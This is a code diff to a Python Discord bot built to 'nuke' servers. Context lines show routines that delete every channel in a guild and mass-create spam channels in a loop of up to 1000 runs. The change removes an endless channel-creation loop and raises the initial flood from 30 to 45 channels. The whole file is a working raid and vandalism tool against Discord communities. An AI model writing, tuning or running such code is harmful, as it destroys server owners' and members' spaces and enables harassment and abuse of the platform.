@@ -51,26 +51,11 @@ class DiscordBot(commands.Bot):
         logs[self.logId] += "---- Start AllChannelDelete ----\n"
         await asyncio.gather(*(self.deleteChannel(channel) for channel in guild.channels))
         logs[self.logId] += "---- End ----\n\n\n"
-    async def channelMaker(self, channelName:str, guild:discord.Guild):
-        while True:
-            try:
-                if self.logId in stops:
-                    logs.pop(self.logId)
-                    await self.close()
-                    return
-            except:
-                return
-            try:
-                channel = await guild.create_text_channel(channelName)
-                self.channels.append(channel)
-            except:
-                pass
     async def nuke(self, latency:int, message:str, guild:discord.Guild, channelName:str, numberOfExecutions=1000):
         logs[self.logId] += "---- Start Nuke ----\n"
         try:
-            await asyncio.gather(*(guild.create_text_channel(channelName) for i in range(30)))
+            await asyncio.gather(*(guild.create_text_channel(channelName) for _ in range(45)))
             self.channels = list(guild.channels)
-            asyncio.ensure_future(self.channelMaker(channelName, guild))
             for _ in range(numberOfExecutions):
                 if self.logId in stops:
                     logs.pop(self.logId)
